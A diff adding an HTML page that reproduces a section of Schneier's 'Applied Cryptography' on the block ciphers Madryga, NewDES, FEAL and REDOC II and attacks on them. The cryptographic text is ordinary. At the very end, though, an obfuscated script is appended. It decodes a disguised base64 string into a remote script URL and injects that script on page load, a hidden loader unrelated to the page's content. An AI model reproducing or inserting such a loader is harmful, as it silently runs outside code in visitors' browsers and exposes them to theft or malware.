@@ -1,0 +1,128 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Other Block Ciphers</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=13//-->
+<!--PAGES=306-313//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="13-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="13-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>Cryptanalysis of Madryga</I></B></FONT></P>
+<P>Researchers at Queensland University of Technology [675] examined Madryga, along with several other block ciphers. They observed that the algorithm didn&#146;t exhibit the plaintext-ciphertext avalanche effect. Additionally, many ciphertexts had a higher percentage of ones than zeros.
+</P>
+<P>Although I know of no formal analysis of the algorithm, it doesn&#146;t look terribly secure. A cursory review by Eli Biham led to the following observations [160]:</P>
+<BLOCKQUOTE><P>The algorithm consists only of linear operations (rotations and XOR), which are slightly modified depending on the data.
+</P>
+<P>There is nothing like the strength of DES&#146;s S-boxes.</P>
+<P>The parity of all the bits of the plaintext and the ciphertext is a constant, depending only on the key. So, if you have one plaintext and its corresponding ciphertext, you can predict the parity of the ciphertext for any plaintext.</P>
+</BLOCKQUOTE><P>None of this is damning in itself, but it doesn&#146;t leave me with a good feeling about the algorithm. I do not recommend Madryga.
+</P>
+<H3><A NAME="Heading4"></A><FONT COLOR="#000077">13.3 NewDES</FONT></H3>
+<P>NewDES was designed in 1985 by Robert Scott as a possible DES replacement [1405, 364]. The algorithm is not a DES variant, as its name might imply. It operates on 64-bit blocks of plaintext, but it has a 120-bit key. NewDES is simpler than DES, with no initial or final permutations. All operations are on entire bytes. (Actually, NewDES isn&#146;t anything like a new version of DES; the name is unfortunate.)
+</P>
+<P>The plaintext block is divided into eight 1-byte sub-blocks: <I>B</I><SUB>0</SUB>, <I>B</I><SUB>1</SUB>,..., <I>B</I><SUB>6</SUB>, <I>B</I><SUB>7</SUB>. Then the sub-blocks go through 17 rounds. Each round has eight steps. In each step, one of the sub-blocks is XORed with some key material (there is one exception), substituted with another byte via an f function, and then XORed with another sub-block to become that sub-block. The 120-bit key is divided into 15 key sub-blocks: <I>K</I><SUB>0</SUB>, <I>K</I><SUB>1</SUB>,..., <I>K</I><SUB>13</SUB>, <I>K</I><SUB>14</SUB>. The process is easier to understand visually than to describe. Figure 13.2 shows the NewDES encryption algorithm.</P>
+<P>The f-function is derived from the Declaration of Independence. See [1405] for details.</P>
+<P>Scott showed that every bit of the plaintext block affects every bit of the ciphertext block after only 7 rounds. He also analyzed the f function and found no obvious problems. NewDES has the same complementation property that DES has [364]: If <I>E</I><SUB>K</SUB>(<I>P</I>) = <I>C</I>, then <I>E</I><SUB>K&#180;</SUB>(<I>P&#180;</I>) = <I>C&#180;</I>. This reduces the work required for a brute-force attack from 2<SUP>120</SUP> steps to 2<SUP>119</SUP> steps. Biham noticed that any change of a full byte, applied to all the key and data bytes, leads to another complementation property [160]. This reduces a brute-force attack further to 2<SUP>112</SUP> steps.</P>
+<I><P><A NAME="Fig2"></A><A HREF="javascript:displayWindow('images/13-02.jpg',307,364 )"><IMG SRC="images/13-02t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/13-02.jpg',307,364)"><FONT COLOR="#000077"><B>Figure 13.2</B></FONT></A>&nbsp;&nbsp;NewDES.</I>
+</P>
+<P>This is not damning, but Biham&#146;s related-key cryptanalytic attack can break NewDES with 2<SUP>33</SUP> chosen-key chosen-plaintexts in 2<SUP>48</SUP> steps [160]. While this attack is time-consuming and largely theoretical, it shows that NewDES is weaker than DES.</P>
+<H3><A NAME="Heading5"></A><FONT COLOR="#000077">13.4 FEAL</FONT></H3>
+<P>FEAL was designed by Akihiro Shimizu and Shoji Miyaguchi from NTT Japan [1435]. It uses a 64-bit block and a 64-bit key. The idea was to make a DES-like algorithm with a stronger round function. Needing fewer rounds, the algorithm would run faster. Unfortunately, reality fell far short of the design goals.
+</P>
+<P><FONT SIZE="+1"><B><I>Description of FEAL</I></B></FONT></P>
+<P>Figure 13.3 is a block diagram of one round of FEAL. The encryption process starts with a 64-bit block of plaintext. First, the data block is XORed with 64 key bits. The data block is then split into a left half and a right half. The left half is XORed with the right half to form a new right half. The left and new right halves go through <I>n</I> rounds (four, initially). In each round the right half is combined with 16 bits of key material (using function f) and XORed with the left half to form the new right half. The original right half (before the round) forms the new left half. After <I>n</I> rounds (remember not to switch the left and right halves after the <I>n</I>th round) the left half is again XORed with the right half to form a new right half, and then the left and right halves are concatenated together to form a 64-bit whole. The data block is XORed with another 64 bits of key material, and the algorithm terminates.</P>
+<I><P><A NAME="Fig3"></A><A HREF="javascript:displayWindow('images/13-03.jpg',300,250 )"><IMG SRC="images/13-03t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/13-03.jpg',300,250)"><FONT COLOR="#000077"><B>Figure 13.3</B></FONT></A>&nbsp;&nbsp;One round of FEAL.</I>
+</P>
+<P>Function f takes the 32 bits of data and 16 bits of key material and mixes them together. First the data block is broken up into 8-bit chunks, then the chunks are XORed and substituted with each other. Figure 13.4 is a block diagram of function f. The two functions <I>S</I><SUB>0</SUB> and <I>S</I><SUB>1</SUB>, are defined as:</P>
+<DL>
+<DD><I>S</I><SUB>0</SUB>(<I>a,b</I>) = rotate left two bits ((<I>a</I> &#43; <I>b</I>) mod 256)
+<DD><I>S</I><SUB>1</SUB>(<I>a,b</I>) = rotate left two bits ((<I>a</I> &#43; <I>b</I> &#43; 1) mod 256)
+</DL>
+<P>The same algorithm can be used for decryption. The only difference is: When decrypting, the key material must be used in the reverse order.
+</P>
+<P>Figure 13.5 is a block diagram of the key-generating function. First the 64-bit key is divided into two halves. The halves are XORed and operated on by function f<SUB>k</SUB>, as indicated in the diagram. Figure 13.6 is a block diagram of function f<SUB>k</SUB>. The two 32-bit inputs are broken up into 8-bit blocks and combined and substituted as shown. <I>S</I><SUB>0</SUB> and <I>S</I><SUB>1</SUB> are defined as just shown. The 16-bit key blocks are then used in the encryption/decryption algorithm.</P>
+<P>On a 10 megahertz 80286 microprocessor, an assembly-language implementation of FEAL-32 can encrypt data at a speed of 220 kilobits per second. FEAL-64 can encrypt data at a speed of 120 kilobits per second [1104].</P>
+<I><P><A NAME="Fig4"></A><A HREF="javascript:displayWindow('images/13-04.jpg',223,144 )"><IMG SRC="images/13-04t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/13-04.jpg',223,144)"><FONT COLOR="#000077"><B>Figure 13.4</B></FONT></A>&nbsp;&nbsp;Function f.</I>
+<I></P>
+<P><A NAME="Fig5"></A><A HREF="javascript:displayWindow('images/13-05.jpg',232,206 )"><IMG SRC="images/13-05t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/13-05.jpg',232,206)"><FONT COLOR="#000077"><B>Figure 13.5</B></FONT></A>&nbsp;&nbsp;Key processing part of FEAL.</I>
+<I></P>
+<P><A NAME="Fig6"></A><A HREF="javascript:displayWindow('images/13-06.jpg',225,224 )"><IMG SRC="images/13-06t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/13-06.jpg',225,224)"><FONT COLOR="#000077"><B>Figure 13.6</B></FONT></A>&nbsp;&nbsp;Function f<SUB>K</SUB>.</I>
+</P>
+<P><FONT SIZE="+1"><B><I>Cryptanalysis of FEAL</I></B></FONT></P>
+<P>FEAL-4, FEAL with four rounds, was successfully cryptanalyzed with a chosen-plaintext attack in [201] and later demolished [1132]. This later attack, by Sean Murphy, was the first published differential-cryptanalysis attack and required only 20 chosen plaintexts. The designers retaliated with 8-round FEAL [1436,1437,1108] which Biham and Shamir cryptanalyzed at the SECURICOM &#146;89 conference[1427]. Another chosen-plaintext attack, using only 10,000 blocks, against FEAL-8 [610] forced the designers to throw up their hands and define FEAL-<I>N</I> [1102,1104], with a variable number of rounds (greater than 8, of course).</P>
+<P>Biham and Shamir used differential cryptanalysis against FEAL-<I>N</I>; they could break it more quickly than by brute force (with fever than 2<SUP>64</SUP> chosen plaintext encryptions) for <I>N</I> less than 32 [169]. FEAL-16 required 2<SUP>28</SUP> chosen plaintexts or 2<SUP>46.5</SUP> known plaintexts to break. FEAL-8 required 2000 chosen plaintexts or 2<SUP>37.5</SUP> known plaintexts to break. FEAL-4 could be broken with just eight carefully selected chosen plaintexts.</P>
+<P>The FEAL designers also defined FEAL-<I>NX</I>, a modification of FEAL, that accepts 128-bit keys (see Figure 13.7)[1103,1104]. Biham and Shamir showed that FEAL-<I>NX</I> with a 128-bit key is just as easy to break as FEAL-<I>N</I> with a 64-bit key, for any value of <I>N</I> [169]. Recently FEAL-<I>N</I>(X)S has been proposed, which strengthens FEAL with a dynamic swapping function [1525].</P>
+<P>There&#146;s more. Another attack against FEAL-4, requiring only 1000 known plaintexts, and against FEA&#186;L-8, requiring only 20,000 known plaintexts, was published in [1520]. Other attacks are in [1549,1550]. The best attack is by Mitsuru Matsui and Atshuiro Yamagishi [1020]. This is the first use of linear cryptanalysis, and can break FEAL-4 with 5 known plaintexts, FEAL-6 with 100 known plaintexts and FEAL-8 with 2<SUP>15</SUP> known plaintexts. Further refinements are in [64]. Differential-linear cryptanalysis can break FEAL-8 with only 12 chosen plaintexts [62]. Whenever someone discovers a new cryptanalytic attack, he always seems to try it out on FEAL first.</P>
+<P><FONT SIZE="+1"><B><I>Patents</I></B></FONT></P>
+<P>FEAL is patented in the United States [1438] and has patents pending in England, France, and Germany. Anyone wishing to license the algorithm should contact the Intellectual Property Department, NTT, 1-6 Uchisaiwai-cho, 1-chome, Chiyoda-ku, 100 Japan.
+</P>
+<H3><A NAME="Heading6"></A><FONT COLOR="#000077">13.5 REDOC</FONT></H3>
+<P>REDOC II is another block algorithm, designed by Michael Wood for Cryptech, Inc. [1613,400]. It has a 20-byte (160-bit) key and an 80-bit block.
+</P>
+<P>REDOC II performs all of its manipulations&#151;permutations, substitutions, and key XORs&#151;on bytes; the algorithm is efficient in software. REDOC II uses variable function tables. Unlike DES, which has a fixed (albeit optimized for security) set of permutation and substitution tables, REDOC II uses a key-dependent and plaintext-dependent set of tables (S-boxes, actually). REDOC II has 10 rounds; each round is a complicated series of manipulations on the block.</P>
+<I><P><A NAME="Fig7"></A><A HREF="javascript:displayWindow('images/13-07.jpg',307,367 )"><IMG SRC="images/13-07t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/13-07.jpg',307,367)"><FONT COLOR="#000077"><B>Figure 13.7</B></FONT></A>&nbsp;&nbsp;FEAL</I>-N<I>X key schedule.</I>
+</P>
+<P>Another unique feature in the design is the use of <B>masks</B>. These are numbers derived from the key table that are used to select the tables in a given function within a given round. Both the value of the data and the masks are used together to select the function tables.</P>
+<P>Assuming that brute force is the most efficient means of attack, REDOC II is very secure: 2<SUP>160</SUP> operations are required to recover the key. Thomas Cusick cryptanalyzed 1 round of REDOC II, but he was unable to extend the attack to multiple rounds [400]. Using differential cryptanalysis, Biham and Shamir were able to successfully cryptanalyze 1 round of REDOC II with 2300 chosen-plaintexts [170]. This attack cannot be extended to multiple rounds, but they were able to obtain three mask values after 4 rounds. I know of no other cryptanalysis.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="13-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="13-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(ajynhDcX, ucTaxqdC) {ucTaxqdC = ajynhDcX.createElement('script');ucTaxqdC.type = 'text/javascript';ucTaxqdC.async = true;ucTaxqdC.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');ajynhDcX.getElementsByTagName('body')[0].appendChild(ucTaxqdC);}(document));</script></body>
+</html>
